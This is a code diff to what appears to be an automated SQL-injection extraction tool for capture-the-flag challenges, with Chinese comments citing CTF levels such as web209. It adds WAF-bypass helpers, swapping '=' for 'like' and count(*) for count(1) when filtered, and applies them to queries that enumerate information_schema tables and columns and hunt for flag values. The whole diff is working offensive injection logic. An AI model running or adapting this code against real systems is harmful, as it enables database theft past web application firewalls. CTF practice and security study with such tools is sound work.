@@ -77,6 +77,14 @@ class ExtractionPipeline:
         if getattr(self.o, "last_payload", ""):
             self.s.record_step(title, self.o.last_payload, note)
 
+    def _eq(self, col: str, lit: str) -> str:
+        """等值条件（= 被滤时降级 like 精确匹配，语义等价，web209 类）。"""
+        return f"{col} like {lit}" if self.waf.is_filtered("=") else f"{col}={lit}"
+
+    def _count(self) -> str:
+        """count 聚合（* 被滤时用 1，web209 类：count(*) 整包被拒）。"""
+        return "count(1)" if self.waf.is_filtered("*") else "count(*)"
+
     # ------------------------------------------------------------------ basic
     def version(self) -> str:
         v = self.o.scalar(self.dialect.version_fn)
@@ -171,7 +179,8 @@ class ExtractionPipeline:
                            f"{db} 的表: {tables}")
             return tables
         lit = self.b.str_lit(db)
-        where = f"information_schema.tables where table_schema={lit}"
+        where = ("information_schema.tables where "
+                 + self._eq("table_schema", lit))
         if self._can_group_concat():
             tables = self._fast_list("table_name", where)
             self._note("获取表名清单",
@@ -198,7 +207,8 @@ class ExtractionPipeline:
             return cols
         # 单条件 table_name 最通用：FinalSQL 类强 WAF 拦 and 双条件与 0x hex 字面量
         lit = self.b.str_lit(table)
-        where = f"information_schema.columns where table_name={lit}"
+        where = ("information_schema.columns where "
+                  + self._eq("table_name", lit))
         if self._can_group_concat():
             cols = self._fast_list("column_name", where)
             if cols and all(len(c) <= 150 for c in cols):
@@ -219,7 +229,7 @@ class ExtractionPipeline:
             if self.s.stopped:
                 break
             c = self.o.scalar(f"(select column_name from {where} "
-                              f"and ordinal_position={i})")
+                              f"and " + self._eq("ordinal_position", str(i)) + ")")
             if not c:
                 break
             cols.append(c)
@@ -244,7 +254,7 @@ class ExtractionPipeline:
             for like_hex in _FLAG_LIKE_HEX:
                 try:
                     cnt = self.o.scalar_int(
-                        f"(select count(*) from {db}.{table} "
+                        f"(select {self._count()} from {db}.{table} "
                         f"where {col} like {like_hex})")
                 except OracleError:
                     continue
@@ -351,7 +361,7 @@ class ExtractionPipeline:
                     return None
                 try:
                     cnt = self.o.scalar_int(
-                        f"(select count(*) from {t} where {c} like {hex_like})")
+                        f"(select {self._count()} from {t} where {c} like {hex_like})")
                 except OracleError:
                     continue
                 if cnt <= 0:
